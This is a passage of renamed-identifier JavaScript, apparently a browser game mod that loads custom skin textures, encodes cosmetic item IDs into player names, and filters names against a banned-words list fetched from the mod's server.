            _0x2d5dc3(_0x5c8983.loaded / _0x5c8983.total);
          }
        }
      }
    }).fail(function () {
      _0x4b5a15(new Error());
    }).done(function (_0x3f7b91) {
      _0x583147(_0x3f7b91);
    });
  };
  _0x498743.$d = function (_0x56a81a, _0xad1cdf, _0x1fa1f4) {
    function _0x37cc0e(_0x240726) {
      var _0x4a7fa6 = _0x1fa1f4.Id.Md;
      _0x1b1caa.Rd(_0x4a7fa6, _0x1fa1f4.Od.bc(_0x4a7fa6).lc(_0x240726));
    }
    var _0x1b1caa = this;
    if (this.Fd) {
      this.Pd();
      return;
    }
    var _0x232aaf;
    var _0x38f9f0;
    var _0x524f23 = {};
    var _0x3c28b1 = function _0x53e815() {
      for (var _0x722364 = 0; _0x722364 < _0xad1cdf.length; _0x722364++) {
        try {
          window.URL.revokeObjectURL(_0xad1cdf[_0x722364].Xd);
        } catch (_0x3af98f) {}
      }
      _0x1b1caa.Sd(new Error());
    };
    var _0x926686 = function _0x4bfe17() {
      var _0x3a3e94 = _0x29aad8 == 5 ? 0 : _0x29aad8;
      _0x37cc0e(_0x3a3e94 / 4);
      _0x524f23[_0x232aaf.ae] = new _0x498743.$C.be(_0x232aaf.Xd, _0x38f9f0);
      _0xb7b665();
    };
    var _0xb7b665 = function _0x19bb84() {
      try {
        if (_0x29aad8 < _0xad1cdf.length) {
          _0x232aaf = _0xad1cdf[_0x29aad8];
          _0x29aad8++;
          if (_0x232aaf.custom) {
            try {
              let _0x33fa44 = null;
              const _0x142092 = _0x56a81a.textureDict[_0x232aaf.ae];
              if (_0x232aaf.textureUrl) {
                if (_0x232aaf.textureUrl.startsWith("data:image/")) {
                  const _0x4e2bbe = PIXI.BaseTexture.from(_0x232aaf.textureUrl);
                  _0x33fa44 = new PIXI.Texture(_0x4e2bbe);
                } else if (_0x232aaf.textureUrl.startsWith("http")) {
                  const _0x3edfa0 = PIXI.BaseTexture.from(_0x232aaf.textureUrl);
                  _0x33fa44 = new PIXI.Texture(_0x3edfa0);
                }
              } else if (_0x232aaf.resource && _0x232aaf.resource.texture) {
                _0x33fa44 = _0x232aaf.resource.texture;
              } else if (_0x142092) {
                if (_0x142092.file && _0x142092.file.startsWith("data:image/")) {
                  const _0x4c80c8 = PIXI.BaseTexture.from(_0x142092.file);
                  _0x33fa44 = new PIXI.Texture(_0x4c80c8);
                } else if (_0x142092.relativePath && _0x142092.relativePath.startsWith("http")) {
                  const _0x33b5ad = PIXI.BaseTexture.from(_0x142092.relativePath);
                  _0x33fa44 = new PIXI.Texture(_0x33b5ad);
                } else if (_0x142092.file) {
                  let _0x1332dc = _0x142092.file;
                  if (!_0x1332dc.startsWith("data:image/")) {
                    if (_0x1332dc.length > 222) {
                      _0x1332dc = _0x1332dc.substring(222) + _0x1332dc.substring(0, 222);
                    }
                    _0x1332dc = "data:image/png;base64," + _0x1332dc;
                  }
                  const _0x546bb0 = PIXI.BaseTexture.from(_0x1332dc);
                  _0x33fa44 = new PIXI.Texture(_0x546bb0);
                }
              }
              if (_0x33fa44) {
                _0x524f23[_0x232aaf.ae] = new _0x498743.$C.be(_0x33fa44, _0x33fa44.baseTexture);
              }
            } catch (_0x51ca0f) {}
          } else if (_0x232aaf.resource) {
            try {
              let _0x54160b = null;
              if (_0x232aaf.resource.texture && _0x232aaf.resource.texture.baseTexture) {
                _0x54160b = _0x232aaf.resource.texture;
              } else if (_0x232aaf.resource.data) {
                const _0x2508a0 = PIXI.BaseTexture.from(_0x232aaf.resource.data);
                _0x54160b = new PIXI.Texture(_0x2508a0);
              } else if (_0x232aaf.resource.url) {
                const _0x1dc7c6 = PIXI.BaseTexture.from(_0x232aaf.resource.url);
                _0x54160b = new PIXI.Texture(_0x1dc7c6);
              }
              if (_0x54160b) {
                _0x524f23[_0x232aaf.ae] = new _0x498743.$C.be(_0x54160b, _0x54160b.baseTexture);
              }
            } catch (_0x55b8f7) {}
          }
          _0xb7b665();
          return;
        }
        if (texture.custom && texture.file && !_0x524f23[textureId]) {
          try {
            var _0x4eed54 = texture.file;
            if (_0x4eed54 && !_0x4eed54.startsWith("data:image/")) {
              if (_0x4eed54.length > 222) {
                _0x4eed54 = _0x4eed54.substring(222) + _0x4eed54.substring(0, 222);
              }
              _0x4eed54 = "data:image/png;base64," + _0x4eed54;
            }
            const _0x1a4ad8 = PIXI.BaseTexture.from(_0x4eed54);
            _0x1a4ad8.scaleMode = PIXI.SCALE_MODES.NEAREST;
            _0x1a4ad8.mipmap = PIXI.MIPMAP_MODES.OFF;
            const _0x579ea0 = new PIXI.Texture(_0x1a4ad8);
            _0x524f23[textureId] = new _0x498743.$C.be(_0x579ea0, _0x1a4ad8);
            _0x1a4ad8.update();
          } catch (_0x317952) {}
        }
        Object.assign(_0x56a81a.textureDict, _0x524f23);
        return _0x1b1caa.ce(_0x56a81a, _0x524f23);
      } catch (_0x36e40d) {
        return _0x1b1caa.ce(_0x56a81a, _0x524f23);
      }
    };
    var _0x29aad8 = 0;
    _0xb7b665();
  };
  _0x498743.p = function (_0x2717a7, _0x821514) {
    _0x2717a7 = _0x2717a7.split("|");
    _0x498743.pm[_0x2717a7[0]] = {
      p: _0x2717a7[1],
      i: _0x821514
    };
  };
  window.dynamicSkinSystem = {
    offsetTable: new Map(),
    isInitialized: false,
    findRealSkinValue: function (_0x5e6fff) {
      if (this.offsetTable.has(_0x5e6fff)) {
        return this.offsetTable.get(_0x5e6fff);
      }
      try {
        const _0x401bb6 = window._wup?._anApp?.dh?.Fh;
        if (_0x401bb6) {
          for (const _0x29fcb6 of Object.values(_0x401bb6)) {
            if (_0x29fcb6?.Eh?.ma && _0x29fcb6.Eh.Hh) {
              const _0x40e49f = _0x29fcb6.Eh.ma.substr(-7).substr(0, 2);
              if (parseInt(_0x40e49f, window.vps.g) === _0x5e6fff) {
                this.offsetTable.set(_0x5e6fff, _0x29fcb6.Eh.Hh);
                return _0x29fcb6.Eh.Hh;
              }
            }
          }
        }
      } catch (_0xd9d52) {}
      return null;
    }
  };
  function _0x567dfd(_0x10c77d) {
    let _0x5b462d = {
      a: 0,
      b: 0,
      c: 0,
      d: 0,
      e: 0,
      f: "",
      g: 0,
      h: "",
      i: ""
    };
    let _0x5e7376 = 0;
    _0x5b462d.h = _0x10c77d.substr(-9);
    if (_0x5b462d.h.substr(0, 1) != ".") {
      _0x5b462d.i = "0000";
    } else if ((_0x5e7376 = parseInt(_0x5b462d.h.substr(1, 1), window.vps.g)) > 15) {
      _0x5e7376 -= 16;
      _0x5b462d.i = _0x5e7376.toString(2).padStart(4, 0);
    } else {
      _0x5b462d.i = _0x5e7376.toString(2).padStart(4, 0);
      _0x5e7376 = 0;
    }
    _0x5b462d.f = _0x10c77d.substr(-7);
    if (_0x5b462d.f.substr(0, 2) != "00") {
      const _0x169703 = parseInt(_0x5b462d.f.substr(0, 2), window.vps.g);
      let _0x401598 = (_0x169703 - 1) * (window.vps.g / 9) + window.vps.g * 10;
      _0x401598 = _0x401598 - (window.vps.g - window.vps.g / 9);
      const _0x57e1a8 = window.dynamicSkinSystem.findRealSkinValue(_0x169703);
      if (_0x57e1a8 !== null) {
        const _0x236acf = _0x401598 + _0x57e1a8;
        const _0x1ff3d3 = window.vps.g * 100;
        const _0x1714ff = Math.floor(window.vps.g / 9 * 1000);
        if (_0x236acf >= _0x1ff3d3 || _0x236acf >= _0x1714ff) {
          const _0x49f88e = window.vps.sg && window.vps.sg.includes(_0x236acf);
          if (_0x49f88e) {
            _0x5b462d.a = _0x236acf;
          } else {
            _0x5b462d.a = _0x57e1a8;
          }
        } else {
          _0x5b462d.a = _0x236acf;
        }
      } else {
        _0x5b462d.a = _0x401598;
      }
    }
    if (_0x5b462d.f.substr(5, 1) == "|") {
      if (_0x5b462d.f.substr(6, 1) != "0") {
        _0x5b462d.e = parseInt(_0x5b462d.f.substr(6, 1), window.vps.g);
        if (_0x5b462d.i.substr(3, 1) != "0") {
          if (_0x5e7376 > 0) {
            _0x5b462d.e = _0x5b462d.e + window.vps.g * 20 + (window.vps.g - 1) * 2;
          } else {
            _0x5b462d.e = _0x5b462d.e + window.vps.g * 20;
          }
        } else {
          _0x5b462d.e = _0x5b462d.e - 1 + window.vps.g / 9 * 100;
        }
      }
    } else {
      _0x5b462d.e = parseInt(_0x5b462d.f.substr(6, 1), window.vps.g);
      if (_0x5b462d.i.substr(3, 1) != "0") {
        if (_0x5e7376 > 0) {
          _0x5b462d.e = _0x5b462d.e + window.vps.g * 20 + (window.vps.g - 1) * 3;
        } else {
          _0x5b462d.e = _0x5b462d.e + window.vps.g * 20 + (window.vps.g - 1);
        }
      } else {
        _0x5b462d.e = _0x5b462d.e + (window.vps.g / 9 * 100 + (window.vps.g - 1));
      }
    }
    _0x5b462d.f = _0x5b462d.f.replace("|", "");
    if (_0x5b462d.f.substr(2, 1) != "0") {
      _0x5b462d.b = parseInt(_0x5b462d.f.substr(2, 1), window.vps.g);
      if (_0x5b462d.i.substr(0, 1) != "0") {
        _0x5b462d.b = _0x5b462d.b + window.vps.g * 20;
      } else {
        _0x5b462d.b = _0x5b462d.b - 1 + window.vps.g / 9 * 100;
      }
    }
    if (_0x5b462d.f.substr(3, 1) != "0") {
      _0x5b462d.c = parseInt(_0x5b462d.f.substr(3, 1), window.vps.g);
      if (_0x5b462d.i.substr(1, 1) != "0") {
        _0x5b462d.c = _0x5b462d.c + window.vps.g * 20;
      } else {
        _0x5b462d.c = _0x5b462d.c - 1 + window.vps.g / 9 * 100;
      }
    }
    if (_0x5b462d.f.substr(4, 1) != "0") {
      _0x5b462d.d = parseInt(_0x5b462d.f.substr(4, 1), window.vps.g);
      if (_0x5b462d.i.substr(2, 1) != "0") {
        _0x5b462d.d = _0x5b462d.d + window.vps.g * 20;
      } else {
        _0x5b462d.d = _0x5b462d.d - 1 + window.vps.g / 9 * 100;
      }
    }
    return _0x5b462d;
  }
  function _0x39379e(_0x5b8798, _0x237f61, _0x137e62, _0x3d67e3, _0x45c8c9, _0x4a710a) {
    let _0x56c40a = {
      a: "",
      b: 0,
      c: ""
    };
    if (_0x5b8798 > window.vps.g * 100 + 100 || _0x5b8798 < window.vps.g * 10 || _0x5b8798 === undefined) {
      window.vps.a = _0x5b8798;
      if (_0x5b8798 === undefined) {
        window.vps.a = Math.floor(Math.random() * (window.vps.g / 9) + (window.vps.g - window.vps.g / 9));
      }
      _0x56c40a.a = "00";
    } else {
      window.vps.a = _0x5b8798 - window.vps.g * 10;
      _0x56c40a.b = window.vps.a;
      window.vps.a = window.vps.a % (window.vps.g / 9);
      _0x56c40a.b = (_0x56c40a.b - window.vps.a) / (window.vps.g / 9) + 1;
      window.vps.a = window.vps.a + (window.vps.g - window.vps.g / 9);
      _0x56c40a.a = _0x56c40a.b.toString(window.vps.g).padStart(2, 0);
    }
    if (_0x237f61 > window.vps.g * 20 || _0x237f61 < window.vps.g / 9 * 100 || _0x237f61 === undefined) {
      if (_0x237f61 > window.vps.g * 20 && _0x237f61 < window.vps.g * 30) {
        window.vps.b = _0x237f61 - window.vps.g * 20;
        _0x56c40a.a = _0x56c40a.a + window.vps.b.toString(window.vps.g);
        window.vps.b = 0;
        _0x56c40a.c = _0x56c40a.c + "1";
      } else {
        window.vps.b = _0x237f61;
        if (_0x237f61 === undefined) {
          window.vps.b = 0;
        }
        _0x56c40a.a = _0x56c40a.a + "0";
        _0x56c40a.c = _0x56c40a.c + "0";
      }
    } else {
      window.vps.b = _0x237f61 - window.vps.g / 9 * 100 + window.vps.g / window.vps.g;
      _0x56c40a.a = _0x56c40a.a + window.vps.b.toString(window.vps.g);
      window.vps.b = 0;
      _0x56c40a.c = _0x56c40a.c + "0";
    }
    if (_0x137e62 > window.vps.g * 20 || _0x137e62 < window.vps.g / 9 * 100 || _0x137e62 === undefined) {
      if (_0x137e62 > window.vps.g * 20 && _0x137e62 < window.vps.g * 30) {
        window.vps.c = _0x137e62 - window.vps.g * 20;
        _0x56c40a.a = _0x56c40a.a + window.vps.c.toString(window.vps.g);
        window.vps.c = 0;
        _0x56c40a.c = _0x56c40a.c + "1";
      } else {
        window.vps.c = _0x137e62;
        if (_0x137e62 === undefined) {
          window.vps.c = 0;
        }
        _0x56c40a.a = _0x56c40a.a + "0";
        _0x56c40a.c = _0x56c40a.c + "0";
      }
    } else {
      window.vps.c = _0x137e62 - window.vps.g / 9 * 100 + window.vps.g / window.vps.g;
      _0x56c40a.a = _0x56c40a.a + window.vps.c.toString(window.vps.g);
      window.vps.c = 0;
      _0x56c40a.c = _0x56c40a.c + "0";
    }
    if (_0x3d67e3 > window.vps.g * 20 || _0x3d67e3 < window.vps.g / 9 * 100 || _0x3d67e3 === undefined) {
      if (_0x3d67e3 > window.vps.g * 20 && _0x3d67e3 < window.vps.g * 30) {
        window.vps.d = _0x3d67e3 - window.vps.g * 20;
        if (window.vps.d.toString(window.vps.g) === "z") {
          _0x56c40a.a = _0x56c40a.a + "0";
        } else {
          _0x56c40a.a = _0x56c40a.a + window.vps.d.toString(window.vps.g);
        }
        window.vps.d = 0;
        _0x56c40a.c = _0x56c40a.c + "1";
      } else {
        window.vps.d = _0x3d67e3;
        if (_0x3d67e3 === undefined) {
          window.vps.d = 0;
        }
        _0x56c40a.a = _0x56c40a.a + "0";
        _0x56c40a.c = _0x56c40a.c + "0";
      }
    } else {
      window.vps.d = _0x3d67e3 - window.vps.g / 9 * 100 + window.vps.g / window.vps.g;
      if (window.vps.d.toString(window.vps.g) === "z") {
        _0x56c40a.a = _0x56c40a.a + "0";
      } else {
        _0x56c40a.a = _0x56c40a.a + window.vps.d.toString(window.vps.g);
      }
      window.vps.d = 0;
      _0x56c40a.c = _0x56c40a.c + "0";
    }
    if (_0x45c8c9 > window.vps.g * 20 || _0x45c8c9 < window.vps.g / 9 * 100 || _0x45c8c9 === undefined) {
      if (_0x45c8c9 > window.vps.g * 20 && _0x45c8c9 < window.vps.g * 30) {
        _0x56c40a.b = window.vps.g / window.vps.g;
        if (_0x45c8c9 <= window.vps.g * 20 + (window.vps.g - 1)) {
          window.vps.e = _0x45c8c9 - window.vps.g * 20;
        } else if (_0x45c8c9 <= window.vps.g * 20 + (window.vps.g - 1) * 2) {
          _0x56c40a.b = _0x56c40a.b * 2;
          window.vps.e = _0x45c8c9 - window.vps.g * 20 - (window.vps.g - 1);
        } else if (_0x45c8c9 <= window.vps.g * 20 + (window.vps.g - 1) * 3) {
          window.vps.e = _0x45c8c9 - window.vps.g * 20 - (window.vps.g - 1) * 2;
        } else if (_0x45c8c9 <= window.vps.g * 20 + (window.vps.g - 1) * 4) {
          _0x56c40a.b = _0x56c40a.b * 2;
          window.vps.e = _0x45c8c9 - window.vps.g * 20 - (window.vps.g - 1) * 3;
        } else {
          window.vps.e = 0;
        }
        if (window.vps.e >= window.vps.g) {
          _0x56c40a.b = 2;
          window.vps.e = window.vps.e - (window.vps.g - 1);
        }
        _0x56c40a.a = _0x56c40a.a + window.vps.e.toString(window.vps.g);
        window.vps.e = 0;
        _0x56c40a.c = _0x56c40a.c + "1";
      } else {
        window.vps.e = _0x45c8c9;
        if (_0x45c8c9 === undefined) {
          window.vps.e = 0;
        }
        _0x56c40a.a = _0x56c40a.a + "0";
        _0x56c40a.c = _0x56c40a.c + "0";
        _0x56c40a.b = 0;
      }
    } else {
      _0x56c40a.b = window.vps.g / window.vps.g;
      if (_0x45c8c9 - window.vps.g / 9 * 100 + 1 >= window.vps.g) {
        window.vps.e = _0x45c8c9 - (window.vps.g / 9 * 100 + (window.vps.g - 1));
        _0x56c40a.b = _0x56c40a.b * 2;
      } else {
        window.vps.e = _0x45c8c9 - window.vps.g / 9 * 100 + _0x56c40a.b;
      }
      _0x56c40a.a = _0x56c40a.a + window.vps.e.toString(window.vps.g);
      window.vps.e = 0;
      _0x56c40a.c = _0x56c40a.c + "0";
    }
    if (_0x56c40a.a == "000000") {
      window.vps.f = _0x4a710a.substr(0, 22).padEnd(22);
    } else {
      let _0xf4f9f6 = parseInt(_0x56c40a.c, 2);
      if (_0x45c8c9 > 790 && _0x45c8c9 <= 860) {
        _0xf4f9f6 += 16;
      }
      if (_0x56c40a.b <= 1) {
        _0x56c40a.a = _0x56c40a.a.substr(0, 5) + "|" + _0x56c40a.a.substr(5, 1);
      } else {
        _0x56c40a.a = _0x56c40a.a.substr(0, 4) + "|" + _0x56c40a.a.substr(4, 2);
      }
      if (_0x4a710a == "") {
        _0x4a710a = ".                       .";
      }
      if (_0x56c40a.c == "0000") {
        if (_0x4a710a.substr(23, 1) == ".") {
          _0x4a710a = _0x4a710a.substr(0, 23).padEnd(23) + " " + _0x4a710a.substr(24, 1).padEnd(1);
        }
        window.vps.f = (_0x4a710a.length >= 32 ? _0x4a710a.substr(0, 25) : _0x4a710a.substr(0, 25).padEnd(25)) + _0x56c40a.a;
      } else {
        window.vps.f = (_0x4a710a.length >= 32 ? _0x4a710a.substr(0, 23) : _0x4a710a.substr(0, 23).padEnd(23)) + "." + _0xf4f9f6.toString(window.vps.g) + _0x56c40a.a;
      }
      window.vps.f = window.vps.f.replaceAll(" ", "_");
    }
  }
  function _0x4f11e0(_0x113e2f) {
    return !(_0x113e2f > window.vps.g * 30) && !(_0x113e2f < window.vps.g / 9 * 100) || _0x113e2f == 0;
  }
  function _0x43c260(_0x5f3367) {
    return /^(.{25})(\w{5}\|\w{1})$/.test(_0x5f3367) || /^(.{25})(\w{4}\|\w{2})$/.test(_0x5f3367);
  }
  function _0x224eba(_0x5efeab) {
    _0x5efeab = _0x5efeab.replaceAll("_", " ");
    let _0x5c10b5 = _0x5efeab;
    if (/^(.{25})(\w{7})$/.test(_0x5efeab)) {
      for (_0x5efeab = _0x5efeab.substr(0, 15).trim(); _0x5efeab.substr(_0x5efeab.length - 1, 1) == ".";) {
        _0x5efeab = _0x5efeab.substr(0, _0x5efeab.length - 1);
      }
      _0x5c10b5 = _0x5efeab;
    } else if (/^(.{25})(\w{5}\|\w{1})$/.test(_0x5efeab) || /^(.{25})(\w{4}\|\w{2})$/.test(_0x5efeab)) {
      if (_0x5efeab.substr(-9).substr(0, 1) != ".") {
        _0x5c10b5 = _0x5efeab.substr(0, 25).trim();
      } else {
        _0x5c10b5 = _0x5efeab.substr(0, 23).trim();
      }
    }
    return _0x5c10b5;
  }
  function _0x4af14e() {
    fetch(window.vps.s_l + "/words").then(_0x358e01 => {
      if (!_0x358e01.ok) {
        throw new Error("HTTP error! status: " + _0x358e01.status);
      }
      return _0x358e01.json();
    }).then(_0x53eb26 => {
      if (Array.isArray(_0x53eb26)) {
        window.vps.bannedWords = _0x53eb26;
        localStorage.setItem("vps", JSON.stringify(window.vps));
      } else {
        console.warn("البيانات المستلمة ليست مصفوفة:", _0x53eb26);
        window.vps.bannedWords = [];
      }
    }).catch(_0x3233be => {
      console.error("خطأ في تحميل الكلمات المحظورة:", _0x3233be);
      window.vps.bannedWords = [];
    });
  }
  if (window.vps.bannedWordsEnabled) {
    _0x4af14e();
  }
  function _0x553ea5(_0x2eee43, _0x1dc8cb = false) {
    if (_0x1dc8cb || window.vps.bannedWordsEnabled && window.vps.bannedWords && window.vps.bannedWords.length > 0) {
      let _0x4d7b42 = _0x2eee43.replace(/[0-9*_\-\s\u064B-\u065F\u0640\u06D4]/g, "").replace(/[أإآ]/g, "ا").replace(/[ؤ]/g, "و").replace(/[ئ]/g, "ي").replace(/[ة]/g, "ه").replace(/[s$]/gi, "س").replace(/[k]/gi, "ك").replace(/[g]/gi, "غ").replace(/[z]/gi, "ز").replace(/[x]/gi, "ك").replace(/[c]/gi, "س").replace(/[v]/gi, "ف").replace(/[b]/gi, "ب").replace(/[n]/gi, "ن").replace(/[m]/gi, "م").replace(/[r]/gi, "ر").replace(/[t]/gi, "ت").replace(/[y]/gi, "ي").replace(/[a]/gi, "ا").replace(/[e]/gi, "ع").replace(/[h]/gi, "ه").replace(/[w]/gi, "و").replace(/[d]/gi, "د").replace(/[f]/gi, "ف").replace(/[l]/gi, "ل").replace(/[j]/gi, "ج").replace(/[p]/gi, "ب").replace(/[q]/gi, "ق").toLowerCase();
      for (let _0x408d25 of window.vps.bannedWords) {
        if (_0x408d25) {
          let _0x2e2800 = _0x408d25.replace(/[أإآ]/g, "ا").replace(/[ؤ]/g, "و").replace(/[ئ]/g, "ي").replace(/[ة]/g, "ه").toLowerCase();
          if (_0x4d7b42.includes(_0x2e2800)) {
            return "أن الله يراك";
          }
        }
      }
    }
    return _0x2eee43;
  }
  _0x498743.ae = function (_0x49987d, _0x4e7c51, _0x1896b4) {
    if (_0x4e7c51.maV !== 1) {
      _0x4e7c51.maV = 1;
      var _0x5bc49a = _0x4e7c51.ma.trim();
      if (_0x43c260(_0x5bc49a)) {
        try {
          var _0x326282 = _0x567dfd(_0x5bc49a);
          var _0x53f35d = _0x326282.a > 0;
          var _0x458314 = _0x4f11e0(_0x326282.b);
          var _0x3595eb = _0x4f11e0(_0x326282.c);
          var _0x4c57a2 = _0x4f11e0(_0x326282.d);
          var _0x5b80ce = _0x4f11e0(_0x326282.e);
          if (_0x1896b4 && _0x1896b4.dh && _0x1896b4.dh.Fh && _0x1896b4.dh.Fh[_0x4e7c51.ae] && _0x1896b4.dh.Fh[_0x4e7c51.ae].Eh) {
            var _0x50b965 = _0x1896b4.dh.Fh[_0x4e7c51.ae].Eh;
            if (_0x53f35d && _0x326282.a > 0) {
              if (_0x50b965.Hh !== undefined) {
                _0x50b965.Hh = _0x326282.a;
              }
              if (_0x50b965.skinId !== undefined) {
                _0x50b965.skinId = _0x326282.a;
              }
              if (_0x50b965.skin !== undefined) {
                _0x50b965.skin = _0x326282.a;
              }
              if (_0x50b965.appearance && _0x50b965.appearance.skin !== undefined) {
                _0x50b965.appearance.skin = _0x326282.a;
              }
            }
            if (_0x458314 && _0x326282.b > 0) {
              if (_0x50b965.ni !== undefined) {
                _0x50b965.ni = _0x326282.b;
              }
              if (_0x50b965.eyesId !== undefined) {
                _0x50b965.eyesId = _0x326282.b;
              }
            }
            if (_0x3595eb && _0x326282.c > 0) {
              if (_0x50b965.oi !== undefined) {
                _0x50b965.oi = _0x326282.c;
              }
              if (_0x50b965.mouthId !== undefined) {
                _0x50b965.mouthId = _0x326282.c;
              }
            }
            if (_0x4c57a2 && _0x326282.d > 0) {
              if (_0x50b965.pi !== undefined) {
                _0x50b965.pi = _0x326282.d;
              }
              if (_0x50b965.glassesId !== undefined) {
                _0x50b965.glassesId = _0x326282.d;
              }
            }
            if (_0x5b80ce && _0x326282.e > 0) {
              if (_0x50b965.qi !== undefined) {
                _0x50b965.qi = _0x326282.e;
              }
              if (_0x50b965.hatId !== undefined) {
                _0x50b965.hatId = _0x326282.e;
              }
            }
          }
          var _0x2e6880 = _0x224eba(_0x5bc49a);
          _0x4e7c51.ma = _0x54c117(_0x2e6880);
        } catch (_0x2e8406) {
          console.error("خطأ في فك التشفير:", _0x2e8406);
          _0x4e7c51.ma = _0x54c117(_0x4e7c51.ma);
        }
      } else {
        _0x4e7c51.ma = _0x54c117(_0x4e7c51.ma);
      }
    }
    _0x4e7c51.ma = _0x54c117(_0x4e7c51.ma);
  };
  _0x498743.Xp = function (_0x38a049, _0x3f812b, _0x5bb3c7, _0x264132, _0x5f26ca, _0x54d41f, _0x459b2b) {
    _0x39379e(_0x5bb3c7, _0x264132, _0x5f26ca, _0x54d41f, _0x459b2b, _0x3f812b || "");
    return window.vps.f;
  };
  _0x498743.processNewSkinFormat = function (_0x27a2f4, _0x9e3793) {
    try {
      Object.keys(_0x27a2f4).forEach(function (_0x393c22) {
        if (_0x393c22.startsWith("custom_skin_")) {
          const _0x43a1a2 = _0x27a2f4[_0x393c22];
        }
      });
      if (!_0x9e3793.skinArrayDict) {
        _0x9e3793.skinArrayDict = [];
      }
      if (!_0x9e3793.skinGroupArrayDict) {
        _0x9e3793.skinGroupArrayDict = [];
      }
      if (!_0x9e3793.textureDict) {
        _0x9e3793.textureDict = {};
      }
      if (!_0x9e3793.regionDict) {
        _0x9e3793.regionDict = {};
      }
      let _0x34c740 = null;
      for (let _0x15905f = 0; _0x15905f < _0x9e3793.skinGroupArrayDict.length; _0x15905f++) {
        if (_0x9e3793.skinGroupArrayDict[_0x15905f].id === "TimMap Skins") {
          _0x34c740 = _0x9e3793.skinGroupArrayDict[_0x15905f];
          break;
        }
      }
      if (!_0x34c740) {
        _0x34c740 = {
          isCustom: true,
          id: "TimMap Skins",
          img: atob(savedImages[33]),
          name: {
            de: "TimMap Skins",
            en: "TimMap Skins",
            es: "Nuevos Skins Personalizados",
            fr: "Nouveaux Skins Personnalisés",
            uk: "Нові Користувацькі скіни",
            ar: "سكنات جديدة مخصصة"
          },
          list: []
        };
      }
      Object.keys(_0x27a2f4).forEach(function (_0x1ce751) {
        if (_0x1ce751.startsWith("custom_skin_")) {
          const _0x2262d8 = _0x27a2f4[_0x1ce751];
          if (!_0x2262d8) {
            console.warn("بيانات السكن فارغة:", _0x1ce751);
            return;
          }
          if (_0x2262d8.textureDict) {
            Object.keys(_0x2262d8.textureDict).forEach(function (_0x2c5143) {
              const _0x144e54 = _0x2262d8.textureDict[_0x2c5143];
              if (_0x144e54) {
                let _0x1d8db9 = null;
                if (_0x144e54.file) {
                  _0x1d8db9 = _0x144e54.file;
                  if (_0x1d8db9.startsWith("data:image/png;base64,")) {} else if (!_0x1d8db9.startsWith("data:image/")) {
                    try {
                      _0x1d8db9 = _0x3b73a3(_0x1d8db9);
                    } catch (_0xb71203) {
                      console.warn("❌ فشل فك التشفير:", _0x2c5143, _0xb71203);
                      return;
                    }
                  } else {
                    console.log("📷 النسيج مُعد مسبقاً:", _0x2c5143);
                  }
                } else if (_0x144e54.relativePath || _0x144e54.re1ativePath) {
                  const _0x5d0034 = _0x144e54.relativePath || _0x144e54.re1ativePath;
                  if (_0x5d0034.startsWith("http")) {
                    _0x1d8db9 = _0x5d0034;
                  } else {
                    _0x1d8db9 = window.vps.s_l + "/store/textures/" + _0x5d0034;
                  }
                } else {
                  console.warn("❌ نسيج بدون ملف أو مسار، سيتم تخطيه:", _0x2c5143);
                  return;
                }
                _0x9e3793.textureDict[_0x2c5143] = {
                  custom: true,
                  h1: true,
                  h4: true,
                  file: _0x1d8db9,
                  relativePath: _0x1d8db9.startsWith("http") ? _0x1d8db9 : undefined
                };
              } else {
                console.warn("❌ نسيج فارغ:", _0x2c5143);
              }
            });
          }
          function _0x3b73a3(_0x13a1e6) {
            if (!_0x13a1e6) {
              console.error("بيانات base64 فارغة");
              return "data:image/png;base64,";
            }
            if (typeof _0x13a1e6 === "string" && _0x13a1e6.indexOf("data:image/png;base64,") !== -1) {
              return _0x13a1e6;
            }
            let _0x4d3d63 = 222;
            try {
              if (window.theoKzObjects && typeof window.theoKzObjects.c_v === "number") {
                _0x4d3d63 = window.theoKzObjects.c_v;
              } else if (window.gameSettings && typeof window.gameSettings.c_v === "number") {
                _0x4d3d63 = window.gameSettings.c_v;
              }
            } catch (_0x4a0688) {
              console.error("خطأ في الحصول على قيمة customValue:", _0x4a0688);
            }
            try {
              if (_0x4d3d63 > 0 && _0x13a1e6.length > _0x4d3d63) {
                const _0x55fc5c = "data:image/png;base64," + _0x13a1e6.substring(_0x13a1e6.length - _0x4d3d63) + _0x13a1e6.substring(0, _0x13a1e6.length - _0x4d3d63);
                return _0x55fc5c;
              } else {
                const _0x123437 = "data:image/png;base64," + _0x13a1e6;
                return _0x123437;
              }
            } catch (_0x44bb56) {
              console.error("خطأ في تنسيق البيانات:", _0x44bb56);
              const _0x5ba3cf = "data:image/png;base64," + _0x13a1e6;
              return _0x5ba3cf;
            }
          }
          if (_0x2262d8.regionDict) {
            Object.keys(_0x2262d8.regionDict).forEach(function (_0x3045ff) {
              const _0x48bb5a = _0x2262d8.regionDict[_0x3045ff];
              if (_0x48bb5a) {
                if (_0x48bb5a.texture) {
                  if (!_0x9e3793.textureDict[_0x48bb5a.texture]) {
                    console.error("❌ منطقة تشير لنسيج غير موجود:", _0x3045ff, "→", _0x48bb5a.texture);
                    return;
                  } else {}
                }
                _0x9e3793.regionDict[_0x3045ff] = {
                  texture: _0x48bb5a.texture,
                  h: 96,
                  w: 96,
                  x: _0x48bb5a.x || 0,
                  y: _0x48bb5a.y || 0,
                  px: 0,
                  py: 0,
                  pw: 96,
                  ph: 96
                };
              }
            });
          }
          if (_0x2262d8.skin) {
            const _0x487c7d = _0x2262d8.skin;
            if (!_0x487c7d.id || !_0x487c7d.base || !Array.isArray(_0x487c7d.base)) {
              console.warn("❌ بيانات السكن غير صالحة:", _0x1ce751);
              return;
            }
            let _0x30badb = [];
            let _0x373bda = [];
            _0x487c7d.base.forEach(function (_0x25c3ae) {
              if (!_0x9e3793.regionDict[_0x25c3ae]) {
                _0x30badb.push(_0x25c3ae);
              } else {
                _0x373bda.push(_0x25c3ae);
              }
            });
            if (_0x30badb.length > 0) {
              console.error("❌ السكن يشير لمناطق غير موجودة:", _0x487c7d.id);
              console.error("مناطق مفقودة:", _0x30badb);
              if (_0x373bda.length > 0) {
                _0x487c7d.base = _0x373bda;
              } else {
                console.error("❌ لا توجد مناطق صالحة للسكن:", _0x487c7d.id);
                return;
              }
            }
            const _0x5322ca = {
              id: _0x487c7d.id,
              base: [..._0x487c7d.base],
              guest: _0x487c7d.guest !== false,
              g: _0x487c7d.g !== false,
              price: _0x487c7d.price || 0,
              priceBefore: _0x487c7d.priceBefore || 0,
              nonbuyable: _0x487c7d.nonbuyable !== false,
              prime: _0x487c7d.prime || "c_white",
              glow: _0x487c7d.glow && Array.isArray(_0x487c7d.glow) ? [..._0x487c7d.glow] : Array(_0x487c7d.base.length).fill("a_white"),
              custom: true,
              newSystem: true
            };
            while (_0x5322ca.glow.length < _0x5322ca.base.length) {
